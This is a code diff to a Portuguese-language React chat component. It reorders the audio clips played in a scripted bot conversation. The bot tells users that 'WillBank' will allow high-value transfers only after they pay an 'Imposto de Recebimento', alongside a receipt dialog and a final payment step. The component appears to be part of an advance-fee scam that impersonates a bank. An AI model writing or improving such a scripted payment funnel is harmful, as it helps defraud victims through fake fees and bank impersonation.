@@ -51,8 +51,8 @@ const Chat = () => {
   const [comprovanteDialogOpen, setComprovanteDialogOpen] = useState(false);
   const [dialogType, setDialogType] = useState<"telefone" | "email" | "sms" | null>(null);
 
-  // Enforce audio play order in the chat UI (audio-3 first, then audio-2, then audio-1)
-  const audioOrder = ["/audio/audio-3.mp3", "/audio/audio-2.mp3", "/audio/audio-1.mp3"] as const;
+  // Enforce audio play order in the chat UI (audio-1 first, then audio-2, then audio-3)
+  const audioOrder = ["/audio/audio-1.mp3", "/audio/audio-2.mp3", "/audio/audio-3.mp3"] as const;
   const nextRequiredAudio = audioOrder.find(src => !audioListened.has(src)) ?? null;
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const videoRef = useRef<HTMLVideoElement>(null);
@@ -319,11 +319,11 @@ const Chat = () => {
       </div>, false);
     await delay(2500);
 
-    // Áudio 3 - Validação (primeiro áudio após o certificado)
-    await addAudioMessage("/audio/audio-3.mp3");
+    // Áudio 1 - Validação (primeiro áudio após o certificado)
+    await addAudioMessage("/audio/audio-1.mp3");
     await delay(1000);
     await addBotMessage(<span>Ouça o áudio acima e clique no botão para <strong>confirmar sua validação</strong>.</span>, true, 50);
-    setWaitingForAudio("/audio/audio-3.mp3");
+    setWaitingForAudio("/audio/audio-1.mp3");
     setStep("audio-3-validation");
   };
   const handleConfirmValidation = async () => {
@@ -554,11 +554,11 @@ const Chat = () => {
       </div>, true, 80);
     await delay(1500);
 
-    // Áudio 1 - Taxas (terceiro e último áudio)
-    await addAudioMessage("/audio/audio-1.mp3");
+    // Áudio 3 - Taxas (terceiro e último áudio)
+    await addAudioMessage("/audio/audio-3.mp3");
     await delay(1500);
     await addBotMessage(<span>Somente após você finalizar o pagamento do Imposto de Recebimento a WillBank terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal.</span>, true, 120);
-    setWaitingForAudio("/audio/audio-1.mp3");
+    setWaitingForAudio("/audio/audio-3.mp3");
     setStep("final");
   };
   const handleFinalPayment = () => {
